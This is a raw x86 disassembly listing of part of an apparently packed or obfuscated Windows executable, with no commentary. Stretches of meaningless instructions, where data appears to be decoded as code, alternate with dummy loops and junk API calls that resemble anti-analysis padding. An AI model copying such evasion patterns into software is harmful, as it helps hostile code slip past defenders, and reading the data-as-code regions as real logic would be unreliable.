  405968:	xor    edx,edx
  40596a:	jmp    0x405ad3
  40596f:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  405971:	sub    esi,DWORD PTR [esi+0x7161b2eb]
  405977:	mov    ah,0xc8
  405979:	mov    esi,0x8b116011
  40597e:	inc    eax
  40597f:	(bad)  
  405980:	xor    eax,0x7fc47070
  405985:	jo     0x4059f7
  405987:	sub    eax,0x2b8405f8
  40598c:	fisubr DWORD PTR [ebx]
  40598e:	add    eax,0x17383af0
  405993:	xor    al,bl
  405995:	mov    ds:0x545bb3ef,eax
  40599a:	mov    al,ds:0xea8524b5
  40599f:	ficom  WORD PTR [edi-0x80]
  4059a2:	pop    edi
  4059a3:	mov    ah,0xa4
  4059a5:	rol    DWORD PTR [esi+0x4ea8a96e],cl
  4059ab:	add    dh,BYTE PTR [esi-0x7c]
  4059ae:	fmul   DWORD PTR [ecx]
  4059b0:	mov    bh,0x2e
  4059b2:	fsubrp st(6),st
  4059b4:	inc    eax
  4059b5:	and    DWORD PTR [esi],edx
  4059b7:	cld    
  4059b8:	add    BYTE PTR [edx+ebx*4],ch
  4059bb:	pop    es
  4059bc:	dec    esp
  4059bd:	sbb    DWORD PTR [ebp+0x53e273d9],edi
  4059c3:	call   DWORD PTR [edi+ebp*4+0x5af84269]
  4059ca:	pop    es
  4059cb:	and    bh,BYTE PTR [edx+0x62a49a59]
  4059d1:	add    dh,BYTE PTR [edi-0x4c]
  4059d4:	mov    edi,0x315c3d54
  4059d9:	in     al,dx
  4059da:	mov    ds:0x1d3685ef,al
  4059df:	into   
  4059e0:	mov    edi,0xfb8b445e
  4059e5:	outs   dx,DWORD PTR ds:[esi]
  4059e6:	dec    edi
  4059e7:	xchg   ebp,eax
  4059e8:	add    esp,DWORD PTR [ebx]
  4059ea:	pop    ss
  4059eb:	jp     0x405a4f
  4059ed:	xchg   esp,eax
  4059ee:	enter  0x69bc,0x6e
  4059f2:	test   al,0xdb
  4059f4:	outs   dx,BYTE PTR ds:[esi]
  4059f5:	add    edi,DWORD PTR [ecx-0x29]
  4059f8:	inc    edi
  4059f9:	and    dl,BYTE PTR [edi+0x5a]
  4059fc:	iret   
  4059fd:	dec    BYTE PTR [esi-0x4d85964b]
  405a03:	pop    ecx
  405a04:	push   ecx
  405a05:	popf   
  405a06:	pop    ds
  405a07:	jmp    0x405a6e
  405a09:	outs   dx,DWORD PTR ds:[esi]
  405a0a:	retf   
  405a0b:	stos   DWORD PTR es:[edi],eax
  405a0c:	in     al,0xe9
  405a0e:	std    
  405a0f:	jnp    0x405a69
  405a11:	enter  0x5465,0xdf
  405a15:	sub    eax,DWORD PTR [esi]
  405a17:	rcr    BYTE PTR [esi+0x7c64638e],1
  405a1d:	stc    
  405a1e:	fwait
  405a1f:	into   
  405a20:	jo     0x405a35
  405a22:	jle    0x4059ec
  405a24:	cmp    eax,0xb3ec0651
  405a29:	xor    BYTE PTR [eax+0x1a],0xb2
  405a2d:	dec    eax
  405a2e:	in     eax,0x83
  405a30:	lock mov cl,al
  405a33:	mov    WORD PTR [ecx+0x4d2e3d8c],?
  405a39:	fsub   st(6),st
  405a3b:	mov    dl,0x13
  405a3d:	mov    dh,0x39
  405a3f:	xchg   ebx,eax
  405a40:	stc    
  405a41:	ins    BYTE PTR es:[edi],dx
  405a42:	pop    es
  405a43:	add    BYTE PTR [eax-0x37],0x31
  405a47:	jns    0x4059d0
  405a49:	in     eax,dx
  405a4a:	dec    edx
  405a4b:	clc    
  405a4c:	(bad)  
  405a4d:	mov    DWORD PTR [edx+0xf],ebx
  405a50:	adc    edi,DWORD PTR [ebx+0x38]
  405a53:	not    DWORD PTR [edx+0x45af594a]
  405a59:	cmp    eax,0x363fa742
  405a5e:	into   
  405a5f:	call   0xce48a231
  405a64:	and    esp,DWORD PTR [ecx]
  405a66:	imul   esp,DWORD PTR ds:0x594f3c2b,0xf2144f0d
  405a70:	jmp    0x3524c69a
  405a75:	push   edx
  405a76:	pop    ebx
  405a77:	and    cl,al
  405a79:	dec    edx
  405a7a:	pop    ds
  405a7b:	icebp  
  405a7c:	add    al,0xe5
  405a7e:	fadd   st,st(0)
  405a80:	aaa    
  405a81:	jp     0x405a54
  405a83:	jo     0x405a71
  405a85:	cli    
  405a86:	or     esp,ebp
  405a88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a89:	lahf   
  405a8a:	push   edx
  405a8b:	out    dx,eax
  405a8c:	and    BYTE PTR [esi],ch
  405a8e:	sbb    al,0x9c
  405a90:	lods   eax,DWORD PTR ds:[esi]
  405a91:	inc    edx
  405a92:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  405a94:	add    eax,0x2dc3a2bc
  405a99:	push   es
  405a9a:	cmp    BYTE PTR [ecx-0x60cd3527],al
  405aa0:	and    ch,BYTE PTR [ebx]
  405aa2:	call   0xb355:0xcee3e051
  405aa9:	ja     0x405a5f
  405aab:	xchg   edi,eax
  405aac:	fwait
  405aad:	or     dl,BYTE PTR [ecx-0x1200a4e]
  405ab3:	push   es
  405ab4:	mov    edi,0xada3d0a6
  405ab9:	aad    0x52
  405abb:	icebp  
  405abc:	push   es
  405abd:	repz (bad) 
  405abf:	call   0x1da9ac09
  405ac4:	inc    ecx
  405ac5:	mov    cl,0xc8
  405ac7:	call   0x5be7:0x40a67001
  405ace:	es (bad) 
  405ad0:	xlat   BYTE PTR ds:[ebx]
  405ad1:	jle    0x405b37
  405ad3:	mov    ecx,0x7264fca9
  405ad8:	div    ecx
  405ada:	mov    ecx,DWORD PTR [ebp+0x10]
  405add:	and    ecx,eax
  405adf:	or     ecx,0x81161d8f
  405ae5:	mov    eax,ecx
  405ae7:	pop    ebp
  405ae8:	ret    0x18
  405aeb:	push   ebp
  405aec:	mov    ebp,esp
  405aee:	push   ecx
  405aef:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405af6:	add    DWORD PTR ds:0x43441d,ecx
  405afc:	mov    eax,DWORD PTR [ebp-0x4]
  405aff:	mov    edx,DWORD PTR [ebp+0x10]
  405b02:	mov    ecx,DWORD PTR ds:0x4343a6
  405b08:	mov    ecx,DWORD PTR [ecx]
  405b0a:	add    DWORD PTR ds:0x434429,ecx
  405b10:	mov    ecx,0x7510855
  405b15:	xor    eax,ecx
  405b17:	sub    DWORD PTR ds:0x432dce,0x487f
  405b21:	add    eax,0x32729c
  405b26:	xor    DWORD PTR ds:0x434396,0x6d44
  405b30:	mov    DWORD PTR [edx],eax
  405b32:	inc    DWORD PTR ds:0x43436e
  405b38:	mov    eax,DWORD PTR [ebp+0x14]
  405b3b:	sub    DWORD PTR ds:0x432dc2,0x7e8e
  405b45:	mov    edx,DWORD PTR [ebp+0x10]
  405b48:	mov    DWORD PTR [edx+0x4],eax
  405b4b:	mov    eax,DWORD PTR [ebp+0x18]
  405b4e:	mov    edx,DWORD PTR [ebp+0x10]
  405b51:	adc    DWORD PTR ds:0x43436e,0x4326fc
  405b5b:	mov    DWORD PTR [edx+0x8],eax
  405b5e:	mov    eax,DWORD PTR [ebp+0x1c]
  405b61:	mov    edx,DWORD PTR [ebp+0x10]
  405b64:	sub    DWORD PTR ds:0x432dc6,0x432dda
  405b6e:	mov    DWORD PTR [edx+0xc],eax
  405b71:	and    DWORD PTR ds:0x434376,0x0
  405b7b:	jmp    0x405b8b
  405b80:	mov    eax,ds:0x434376
  405b85:	inc    eax
  405b86:	mov    ds:0x434376,eax
  405b8b:	cmp    DWORD PTR ds:0x434376,0x14
  405b92:	jae    0x405bcd
  405b98:	cmp    DWORD PTR ds:0x434376,0x7
  405b9f:	jne    0x405bb0
  405ba5:	push   0x400000
  405baa:	call   DWORD PTR ds:0x432cee
  405bb0:	cmp    DWORD PTR ds:0x434376,0x6
  405bb7:	jne    0x405bc8
  405bbd:	mov    eax,ds:0x434376
  405bc2:	inc    eax
  405bc3:	mov    ds:0x434376,eax
  405bc8:	jmp    0x405b80
  405bcd:	mov    eax,DWORD PTR [ebp+0x20]
  405bd0:	mov    edx,DWORD PTR [ebp+0x10]
  405bd3:	mov    DWORD PTR [edx+0x10],eax
  405bd6:	mov    eax,eax
  405bd8:	mov    eax,DWORD PTR [ebp+0x14]
  405bdb:	test   eax,eax
  405bdd:	mov    eax,DWORD PTR [ebp+0x8]
  405be0:	jne    0x405be9
  405be6:	mov    eax,DWORD PTR [ebp+0xc]
  405be9:	xor    eax,ecx
  405beb:	add    eax,0x32729c
  405bf0:	leave  
  405bf1:	ret    0x1c
  405bf4:	push   ebp
  405bf5:	mov    ebp,esp
  405bf7:	sub    esp,0x78
  405bfa:	add    DWORD PTR ds:0x434382,edi
  405c00:	mov    eax,ds:0x4161a0
  405c05:	sbb    DWORD PTR ds:0x432dd2,0x30a0
  405c0f:	mov    DWORD PTR [ebp-0x10],eax
  405c12:	and    DWORD PTR ds:0x434372,0x0
  405c1c:	jmp    0x405c2c
  405c21:	mov    eax,ds:0x434372
  405c26:	inc    eax
  405c27:	mov    ds:0x434372,eax
  405c2c:	cmp    DWORD PTR ds:0x434372,0x12
  405c33:	jae    0x405cc7
  405c39:	cmp    DWORD PTR ds:0x434372,0x8
  405c40:	jne    0x405c56
  405c46:	push   0x59ce
  405c4b:	push   0x3d0e
  405c50:	call   DWORD PTR ds:0x4329c6
  405c56:	cmp    DWORD PTR ds:0x434372,0x7
  405c5d:	jne    0x405c71
  405c63:	xor    eax,eax
  405c65:	or     eax,DWORD PTR ds:0x434372
  405c6b:	inc    eax
  405c6c:	mov    ds:0x434372,eax
  405c71:	jmp    0x405c21
  405c76:	and    DWORD PTR ds:0x4326ec,0x0
  405c80:	jmp    0x405c93
  405c85:	xor    eax,eax
  405c87:	add    eax,DWORD PTR ds:0x4326ec
  405c8d:	inc    eax
  405c8e:	mov    ds:0x4326ec,eax
  405c93:	cmp    DWORD PTR ds:0x4326ec,0x19
  405c9a:	jae    0x405cc7
  405ca0:	cmp    DWORD PTR ds:0x4326ec,0x24
  405ca7:	jne    0x405cb8
  405cad:	push   0x2979
  405cb2:	call   DWORD PTR ds:0x432cf2
  405cb8:	jmp    0x405c85
  405cbd:	adc    DWORD PTR ds:0x432700,0x4b3c
  405cc7:	mov    eax,ds:0x4162ac
  405ccc:	mov    DWORD PTR [ebp-0x30],eax
  405ccf:	mov    eax,ds:0x43439a
  405cd4:	adc    DWORD PTR ds:0x434372,eax
  405cda:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  405ce1:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  405ce8:	and    DWORD PTR ds:0x432dce,0x0
  405cf2:	jmp    0x405d05
  405cf7:	xor    eax,eax
  405cf9:	xor    eax,DWORD PTR ds:0x432dce
  405cff:	inc    eax
  405d00:	mov    ds:0x432dce,eax
  405d05:	cmp    DWORD PTR ds:0x432dce,0x17
  405d0c:	jae    0x405d74
  405d12:	cmp    DWORD PTR ds:0x432dce,0x24
  405d19:	jne    0x405d65
  405d1f:	push   0x4328ab
  405d24:	push   DWORD PTR [ebp-0x24]
  405d27:	push   DWORD PTR [ebp-0x1c]
  405d2a:	push   0x2bca
  405d2f:	push   0x26af
  405d34:	push   0x4217
  405d39:	push   0x24e1
  405d3e:	push   0x5f7a
  405d43:	push   DWORD PTR [ebp-0x28]
  405d46:	push   0x4151
  405d4b:	push   0x4efd
  405d50:	push   0x2a4d
  405d55:	push   0x1961
  405d5a:	push   0x8799
  405d5f:	call   DWORD PTR ds:0x432c36
  405d65:	jmp    0x405cf7
  405d6a:	sbb    DWORD PTR ds:0x432dca,0x4665
  405d74:	mov    eax,DWORD PTR [ebp-0xc]
  405d77:	push   ebx
  405d78:	sbb    DWORD PTR ds:0x43442d,0x432dd2
  405d82:	push   esi
  405d83:	push   edi
  405d84:	mov    esi,0x7510855
  405d89:	and    DWORD PTR ds:0x4326fc,0xdb
  405d93:	jmp    0x4060e0
  405d98:	mov    ecx,0x75ce7592
  405d9d:	jmp    0x6331ef03
  405da2:	sub    BYTE PTR [ebx],bl
  405da4:	add    al,0xf6
  405da6:	mov    al,BYTE PTR [edi+0x7070348b]
  405dac:	and    BYTE PTR [ebp+0x70],bh
  405daf:	jo     0x405d9e
  405db1:	xor    dh,BYTE PTR [ebx]
  405db3:	mov    cl,0x2
  405db5:	out    0x8e,eax
  405db7:	push   esi
  405db8:	retf   0x8b1d
  405dbb:	fbld   TBYTE PTR [esi-0x44]
  405dbe:	cmp    DWORD PTR [ebp+ebx*8+0x73],ecx
  405dc2:	cld    
  405dc3:	xor    ebp,DWORD PTR [esi+edx*1]
  405dc6:	mov    BYTE PTR [ebp+0x37aa9b96],bh
  405dcc:	sbb    eax,0x50082d60
  405dd1:	shl    DWORD PTR [edx],0xbe
  405dd4:	shr    BYTE PTR [esi],0x16
  405dd7:	or     al,0xe0
  405dd9:	in     eax,dx
  405dda:	lock int3 
  405ddc:	cmp    edi,DWORD PTR [ebx-0x55f874aa]
  405de2:	sbb    BYTE PTR [edx+0x1945aebd],ch
  405de8:	pusha  
  405de9:	inc    edi
  405dea:	(bad)
  405dee:	cmp    ebx,DWORD PTR [ecx-0x1e]
  405df1:	mov    WORD PTR [eax],?
  405df3:	mov    eax,ds:0xf82d312d
  405df8:	popa   
  405df9:	pop    eax
  405dfa:	pusha  
  405dfb:	outs   dx,BYTE PTR ds:[esi]
  405dfc:	jmp    0xf665d72a
  405e01:	mov    bh,0x96
  405e03:	data16 test dh,al
  405e06:	ret    
  405e07:	xchg   edi,eax
  405e08:	mov    esp,ds
  405e0a:	test   eax,0xf0a8b6e2
  405e0f:	(bad)  
  405e10:	int3   
  405e11:	push   edx
  405e12:	test   al,0x49
  405e14:	and    DWORD PTR [edx],ecx
  405e16:	aas    
  405e17:	addr16 clc 
  405e19:	das    
  405e1a:	push   edx
  405e1b:	jl     0x405e84
  405e1d:	(bad)  
  405e1e:	dec    ebp
  405e1f:	gs jp  0x405e47
  405e22:	or     BYTE PTR [ebx+0x75bc4c6b],dh
  405e28:	pop    esp
  405e29:	in     al,0xa7
  405e2b:	cmp    bh,BYTE PTR [esi]
  405e2d:	cmp    BYTE PTR [esi],dl
  405e2f:	and    ah,bh
  405e31:	cmp    esp,DWORD PTR [edx]
  405e33:	out    0x38,al
  405e35:	mov    al,0xf0
  405e37:	js     0x405dfa
  405e39:	cld    
  405e3a:	daa    
  405e3b:	push   eax
  405e3c:	(bad)  
  405e3d:	xchg   ebx,eax
  405e3e:	clc    
  405e3f:	cmp    DWORD PTR [ebx+ebp*2+0x188d0968],esp
  405e46:	push   cs
  405e47:	out    0x5f,al
  405e49:	sub    al,0x1e
  405e4b:	jge    0x405dd3
  405e4d:	test   eax,0x708e6a38
  405e52:	sti    
  405e53:	inc    edi
  405e54:	popa   
  405e55:	pop    ebp
  405e56:	inc    ecx
  405e57:	pop    edx
  405e58:	pop    edx
  405e59:	scas   eax,DWORD PTR es:[edi]
  405e5a:	out    dx,al
  405e5b:	xchg   ebx,eax
  405e5c:	ret    
  405e5d:	mov    ah,0x64
  405e5f:	inc    ecx
  405e60:	(bad)
  405e63:	mov    esp,0x51ad464c
  405e68:	cmp    BYTE PTR [edi],0xd
  405e6b:	fnstsw WORD PTR [ebx+edi*8+0x9]
  405e6f:	cmp    esp,DWORD PTR [ecx-0x59]
  405e72:	add    DWORD PTR [edi],esp
  405e74:	mov    ?,WORD PTR [edi-0x5b]
  405e77:	inc    edi
  405e78:	dec    eax
  405e79:	mov    edi,0x2f209f26
  405e7e:	mov    DWORD PTR [esi+0x5d],ebx
  405e81:	imul   eax,DWORD PTR [ebx],0xa6bf2cea
  405e87:	pop    eax
  405e88:	je     0x405ef9
  405e8a:	or     al,0xd3
  405e8c:	mov    cl,BYTE PTR [ecx]
  405e8e:	cmp    al,0x91
  405e90:	sbb    al,0xc8
  405e92:	shr    BYTE PTR [edi],1
  405e94:	push   0x468538cd
  405e99:	push   ss
  405e9a:	mov    dl,0x8b
  405e9c:	push   edx
  405e9d:	pusha  
  405e9e:	add    eax,0x808514ca
  405ea3:	lahf   
  405ea4:	stc    
  405ea5:	jmp    0x405e76
  405ea7:	and    eax,0x518815d6
  405eac:	outs   dx,BYTE PTR ds:[esi]
  405ead:	stc    
  405eae:	mov    esp,fs
  405eb0:	std    
  405eb1:	dec    ebp
  405eb2:	jo     0x405f27
  405eb4:	or     ah,BYTE PTR [eax]
  405eb6:	mov    al,ds:0x8266542a
  405ebb:	aam    0xd9
  405ebd:	push   edx
  405ebe:	jg     0x405e91
  405ec0:	push   esp
  405ec1:	add    eax,0xa3f09231
  405ec6:	jl     0x405e95
  405ec8:	inc    eax
  405ec9:	mov    ecx,0x435e65af
  405ece:	shl    DWORD PTR [ecx],0x1
  405ed1:	jbe    0x405ea7
  405ed3:	stc    
  405ed4:	and    eax,0x1dfbb51f
  405ed9:	ss push 0x7abca870
  405edf:	cmp    esi,ecx
  405ee1:	mov    ds:0xccac8d8f,al
  405ee6:	push   esi
  405ee7:	fcom   st(1)
  405ee9:	pop    ecx
  405eea:	dec    edi
  405eeb:	mov    ebx,0x8912d3e3
  405ef0:	fist   WORD PTR [edx-0x37]
  405ef3:	pop    esp
  405ef4:	pop    edx
  405ef5:	pop    ss
  405ef6:	jg     0x405e7d
  405ef8:	popa   
  405ef9:	push   es
  405efa:	mov    ebx,0x72a54384
  405eff:	pop    eax
  405f00:	mov    ecx,ebp
  405f02:	arpl   WORD PTR [esi-0x75],bp
  405f05:	fadd   DWORD PTR [ebx-0x53768e38]
  405f0b:	jmp    0x95ab:0xe770899
  405f12:	cs jo  0x405f27
  405f15:	mov    DWORD PTR [eax],edi
  405f17:	std    
  405f18:	enter  0x51d9,0x4f
  405f1c:	or     eax,0x129392a9
  405f21:	cdq    
  405f22:	xchg   DWORD PTR [ebp+ebp*1+0x30d2ec12],esp
  405f29:	jge    0x405eed
  405f2b:	lea    eax,[ebp-0x5]
  405f2e:	aaa    
  405f2f:	jb     0x405f18
  405f31:	(bad)  
  405f33:	inc    ebp
  405f34:	push   ds
  405f35:	push   es
  405f36:	mov    eax,0x6015fc0e
  405f3b:	(bad)  
  405f3c:	enter  0x9a77,0xb7
  405f40:	push   edx
  405f41:	xchg   DWORD PTR [eax-0x4eadf728],eax
  405f47:	ret    
  405f48:	adc    ecx,DWORD PTR [ecx-0x11964a26]
  405f4e:	lods   eax,DWORD PTR ds:[esi]
  405f4f:	adc    edi,eax
  405f51:	mov    cl,0x4a
  405f53:	int3   
  405f54:	pop    edi
  405f55:	mov    al,ds:0xcec41cd7
  405f5a:	inc    esi
  405f5b:	add    cl,ch
  405f5d:	or     bl,ch
  405f5f:	inc    esp
  405f60:	xchg   esp,eax
  405f61:	int    0x74
  405f63:	data16 adc ch,BYTE PTR [edi-0xca48041]
  405f6a:	stc    
  405f6b:	xor    bh,cl
  405f6d:	mov    esi,0x556c780f
  405f72:	push   es
  405f73:	or     bh,BYTE PTR [edx+0x17191bcb]
  405f79:	push   eax
  405f7a:	cmp    al,0x5b
  405f7c:	mov    ah,0x9c
  405f7e:	inc    edx
  405f80:	imul   esp,DWORD PTR [edx],0x7a
  405f83:	mov    ds:0x4025fc9d,al
  405f88:	mov    bh,0xec
  405f8a:	mov    eax,ds:0xcb5c820e
  405f8f:	clc    
  405f90:	out    0x32,eax
  405f92:	adc    ecx,DWORD PTR [esi]
  405f94:	mov    DWORD PTR [ebx-0x172eaefc],eax
  405f9a:	xchg   dl,dh
  405f9c:	cmp    cl,dl
  405f9e:	aam    0x3f
  405fa0:	xchg   ebp,eax
  405fa1:	data16 aam 0xf5
  405fa4:	loope  0x405fd7
  405fa6:	or     al,0x15
  405fa8:	fist   DWORD PTR [edi+ebx*1]
  405fab:	cmp    ebx,DWORD PTR [edx]
  405fad:	and    al,ah
  405faf:	adc    BYTE PTR [ecx-0x3c29e2c3],al
  405fb5:	sub    al,0x2d
  405fb7:	ja     0x405f4d
  405fb9:	mov    cl,0xa8
  405fbb:	dec    si
  405fbd:	popa   
  405fbe:	es scas al,BYTE PTR es:[edi]
  405fc0:	sbb    esi,DWORD PTR [esi-0x6a3ad22c]
  405fc6:	ins    BYTE PTR es:[edi],dx
  405fc7:	ret    0x4531
  405fca:	nop
  405fcb:	dec    eax
  405fcc:	pop    es
  405fcd:	(bad)  ds:0xee0e3f7e
  405fd3:	inc    ebp
  405fd4:	jo     0x405fca
  405fd6:	ins    BYTE PTR es:[edi],dx
  405fd7:	mov    ch,0xe1
  405fd9:	jg     0x406016
  405fdb:	imul   ebp,esp,0xa8a5909
  405fe1:	mov    BYTE PTR [ebp+0x42eabd15],al
  405fe7:	sub    ch,BYTE PTR [ebx]
  405fe9:	jecxz  0x406044
  405feb:	in     eax,dx
  405fec:	inc    edx
  405fed:	mov    dh,0x94
  405fef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ff0:	fidivr WORD PTR [ecx+0x686cfb81]
  405ff6:	mov    DWORD PTR [ebx-0x12],ecx
  405ff9:	and    edx,DWORD PTR [edi-0x6210abd3]
  405fff:	in     al,dx
  406000:	cmp    BYTE PTR [esi+0x52],bl
  406003:	fimul  WORD PTR ds:0xcea5a694
  406009:	push   esp
  40600a:	cld    
  40600b:	(bad)
  40600f:	mov    edx,0x96fbd784
  406014:	xchg   edx,eax
  406015:	jmp    0x60fc67f1
  40601a:	add    edx,esp
  40601c:	addr16 push eax
  40601e:	push   ss
  40601f:	mov    esp,DWORD PTR [edx-0x31]
  406022:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406023:	fs push edx
  406025:	mov    eax,0xe78ef4fc
  40602a:	and    al,0xb9
  40602c:	or     eax,0x44508811
  406031:	adc    al,0xcb
  406033:	add    al,0x7a
  406035:	jb     0x406041
  406037:	jmp    0xc2079f8d
  40603c:	or     edi,DWORD PTR [edx]
  40603e:	(bad)  
  406040:	xor    al,0xbe
  406042:	int3   
  406043:	mov    edx,0x258d8801
  406048:	mov    ds:0x5db1ddd0,eax
  40604d:	int    0x2f
  40604f:	and    ah,BYTE PTR [ebp-0x189560de]
  406055:	mov    bl,0xdf
  406057:	out    dx,al
  406058:	lods   eax,DWORD PTR ds:[esi]
  406059:	(bad)  
  40605b:	inc    DWORD PTR [edi-0x3d2b822c]
  406061:	jl     0x406036
  406063:	push   esi
  406064:	jbe    0x4060e3
  406066:	pop    es
  406067:	adc    dl,BYTE PTR [esi]
  406069:	and    DWORD PTR [eax],esi
  40606b:	shl    ecx,cl
  40606d:	or     ch,ah
  40606f:	xor    al,0x2e
  406071:	test   DWORD PTR [eax],ebx
  406073:	jnp    0x4060b7
  406075:	cmc    
  406076:	lods   eax,DWORD PTR ds:[esi]
  406077:	sar    DWORD PTR [ebp+0x56],cl
  40607a:	xchg   edx,eax
  40607b:	test   al,0x7a
  40607d:	out    0x5d,eax
  40607f:	cmp    BYTE PTR [eax-0x4e],bh
  406082:	or     ecx,ebx
  406084:	push   cs
  406085:	mov    dl,0x4e
  406087:	(bad)  
  406088:	mov    esp,0x29f15e44
  40608d:	xchg   ecx,eax
  40608e:	xchg   ecx,eax
  40608f:	aaa    
  406090:	dec    esi
  406091:	sub    eax,DWORD PTR [esi]
  406093:	xchg   DWORD PTR [edx-0x35],ebp
  406096:	jno    0x406105
  406098:	cdq    
  406099:	push   ebx
  40609a:	sbb    eax,0x96c05092
  40609f:	cld    
  4060a0:	pop    es
  4060a1:	in     eax,dx
  4060a2:	mov    esi,0xaa58e800
  4060a7:	push   edi
  4060a8:	aas    
  4060a9:	rcr    DWORD PTR [eax-0x7f],cl
  4060ac:	jnp    0x4060de
  4060ae:	loop   0x406068
  4060b0:	imul   edx,DWORD PTR [ecx+esi*2+0x5f],0xfffffffa
  4060b5:	sbb    dh,BYTE PTR [ebx]
  4060b7:	xchg   BYTE PTR [eax+0x72],ah
  4060ba:	imul   edx,DWORD PTR [ecx+0x3bfe22c5],0x2102fb9d
  4060c4:	in     al,dx
  4060c5:	adc    esp,ebx
  4060c7:	dec    esp
  4060c8:	imul   ebp,ebp,0xffffffa4
  4060cb:	inc    eax
  4060cc:	sahf   
  4060cd:	cs dec esi
  4060cf:	outs   dx,BYTE PTR ds:[esi]
  4060d0:	cmp    ah,bh
  4060d2:	cwde   
  4060d3:	sbb    al,0x44
  4060d5:	jp     0x406079
  4060d7:	inc    edx
  4060d8:	popa   
  4060d9:	cmp    ch,ch
  4060db:	cmp    eax,0x433c9137
  4060e0:	xor    eax,esi
  4060e2:	add    DWORD PTR ds:0x432dbe,edi
  4060e8:	mov    edi,0x32729c
  4060ed:	and    DWORD PTR ds:0x43441d,0x3e7d
  4060f7:	add    eax,edi
  4060f9:	jmp    0x406446
  4060fe:	xchg   esp,eax
  4060ff:	test   eax,0x69f5e9e0
  406104:	xchg   ecx,eax
  406105:	jno    0x406179
  406107:	xchg   edx,eax
  406108:	js     0x406147
  40610a:	ret    0xa660
  40610d:	cmp    al,0xbb
  40610f:	xor    DWORD PTR [eax+0x70],esi
  406112:	and    BYTE PTR [ebp+0x70],bh
  406115:	jo     0x406156
  406117:	xor    eax,0x30b36298
  40611c:	fs or  eax,0xb881c210
  406122:	and    DWORD PTR [ebx],ecx
  406124:	dec    edi
  406125:	(bad)  
  406126:	mov    dh,0xfe
  406128:	dec    ebx
  406129:	xchg   edx,eax
  40612a:	or     DWORD PTR ds:0xe5ce7b24,eax
  406130:	and    bh,bh
  406132:	pushf  
  406133:	jns    0x40619f
  406135:	fwait
  406136:	imul   edi,esi,0x66
  406139:	mov    dl,0xd3
  40613b:	lock in al,dx
  40613d:	adc    eax,0xaafe6736
  406142:	lahf   
  406143:	scas   eax,DWORD PTR es:[edi]
  406144:	neg    BYTE PTR [ebp-0x18]
  406147:	mov    esi,0x7127cc36
  40614d:	dec    ecx
  40614e:	xchg   BYTE PTR [esi+0x57ceee82],dl
  406154:	add    ax,0x4077
  406158:	aaa    
  406159:	mov    BYTE PTR [ebp-0x2481a29e],bh
  40615f:	rol    al,0x10
  406162:	cld    
  406163:	dec    eax
  406164:	mov    ch,0x13
  406166:	mov    al,0xb8
  406168:	mov    eax,ds:0x5387312d
  40616d:	dec    edi
  40616e:	push   esi
  40616f:	jl     0x4061bf
  406171:	das    
  406172:	popa   
  406173:	(bad)  
  406174:	popf   
  406175:	aaa    
  406176:	lods   al,BYTE PTR ds:[esi]
  406177:	dec    ebx
  406178:	icebp  
  406179:	cmp    eax,0x7bf876b2
  40617e:	jecxz  0x406196
  406180:	push   eax
  406181:	aad    0x13
  406183:	inc    di
  406185:	jnp    0x4061b8
  406187:	outs   dx,BYTE PTR ds:[esi]
  406188:	aaa    
  406189:	push   ds
  40618a:	lock and al,0x1d
  40618d:	or     ah,BYTE PTR [ebp+0x1ce558e5]
  406193:	adc    al,BYTE PTR [ebx+0x68]
  406196:	push   eax
  406197:	mov    eax,ds:0xbe77604a
  40619c:	fiadd  WORD PTR [esi-0x2159e2ef]
  4061a2:	loop   0x406172
  4061a4:	xchg   BYTE PTR [edi],bl
  4061a6:	nop
  4061a7:	dec    ebp
  4061a8:	shr    DWORD PTR [ebp-0x1f33ad42],cl
  4061ae:	jno    0x40613e
  4061b0:	(bad)  
  4061b1:	lds    esp,FWORD PTR [edi-0x45]
  4061b4:	movaps xmm7,XMMWORD PTR [esi+0x6118123]
  4061bb:	jmp    0x4061e5
  4061bd:	push   0xc0e58349
  4061c2:	pushf  
  4061c3:	aam    0x8a
  4061c5:	jg     0x40619b
  4061c7:	fsub   DWORD PTR [edi]
  4061c9:	jmp    0x406218
  4061cb:	xchg   ebp,eax
  4061cc:	pop    ebp
  4061cd:	cwde   
  4061ce:	pop    ds
  4061cf:	and    DWORD PTR [ecx],ebx
  4061d1:	mov    ch,0x82
  4061d3:	jp     0x4061f9
  4061d5:	jl     0x40619e
  4061d7:	xor    ebp,ecx
  4061d9:	sub    bl,ah
  4061db:	(bad)  
  4061de:	xor    ebp,esi
  4061e0:	mov    WORD PTR [edi],es
  4061e2:	dec    edi
  4061e3:	or     dl,BYTE PTR [eax]
  4061e5:	stc    
  4061e6:	aaa    
  4061e7:	outs   dx,DWORD PTR ds:[esi]
  4061e8:	leave  
  4061e9:	in     eax,0x94
  4061eb:	shr    BYTE PTR [ecx+eax*4],1
  4061ee:	call   0xe777:0x72b63e24
  4061f5:	pusha  
  4061f6:	fild   WORD PTR [esi-0x11e33f38]
  4061fc:	lahf   
  4061fd:	and    eax,0x654b9a55
  406202:	loop   0x406192
  406204:	shl    DWORD PTR [edx],0x6
  406207:	sub    edi,edi
  406209:	into   
  40620a:	mov    al,ds:0xf9437ceb
  40620f:	jno    0x406192
  406211:	mov    bl,0x1f
  406213:	and    ebp,ebx
  406215:	inc    edi
  406216:	mov    eax,es:0x50a12ab3
  40621c:	and    DWORD PTR [eax+0x5f6b46af],ebp
  406222:	test   al,0xd5
  406224:	xor    edi,DWORD PTR ds:0x70909020
  40622a:	rcr    BYTE PTR [edx-0x6f],1
  40622d:	shr    DWORD PTR [ecx+0x9f320c7],0x19
  406234:	jns    0x40628b
  406236:	gs or  ebp,0xffffffa2
  40623a:	adc    BYTE PTR [edx-0x32],dl
  40623d:	sti    
  40623e:	inc    esp
  40623f:	cld    
  406240:	(bad)  ss:[eax+0x59]
  406245:	xchg   ebp,eax
  406246:	jb     0x4061f3
  406248:	ds dec ebx
  40624a:	or     al,0x9
  40624c:	call   FWORD PTR [ebx]
  40624e:	push   ds
  40624f:	xor    DWORD PTR [esi+ebx*4-0x2c],0xffffffc7
  406254:	jp     0x4062c6
  406256:	shl    BYTE PTR [ebx+0x2a],0x7f
  40625a:	adc    al,0x61
  40625c:	test   al,0xa
  40625e:	fwait
  40625f:	sub    eax,DWORD PTR [esp+ecx*1+0x33c593f9]
